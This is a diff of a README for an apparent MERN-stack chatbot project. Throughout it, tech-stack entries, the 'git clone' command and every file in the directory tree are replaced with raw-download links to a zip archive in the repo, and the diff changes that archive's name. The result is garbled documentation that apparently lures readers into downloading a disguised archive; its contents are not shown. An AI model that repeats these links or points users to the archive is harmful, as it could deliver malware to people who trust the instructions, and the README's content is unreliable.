@@ -19,8 +19,8 @@ This is a MERN-stack AI chatbot project with a clean, support-inbox style UI (si
 ## 🛠 Tech Stack
 
 - React (Frontend)
-- https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip (Backend)
-- https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+- https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip (Backend)
+- https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
 - Gemini API (for AI responses)
 - Tailwind CSS (for styling)
 - Fetch API (for client-server communication)
@@ -35,7 +35,7 @@ Follow these steps to run the project locally after cloning from GitHub:
 ### 1. Clone the repository
 
 ```bash
-git clone https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+git clone https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
 cd AI-Chatbot
 ```
 
@@ -99,19 +99,19 @@ The app will be available at:
 ```
 chatbot-app/
   ├── components/
-  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
-  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
-  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
-  │     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
-  |── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
-  └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
+  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
+  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
+  │     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
+  |── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
+  └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
 
 chatbot-backend/
   ├── controllers/
-  |     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+  |     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
   ├── routes/
-  │     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
-  └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
+  │     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
+  └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/public/A_Chatbot_poetics.zip
 ```
 
 ---
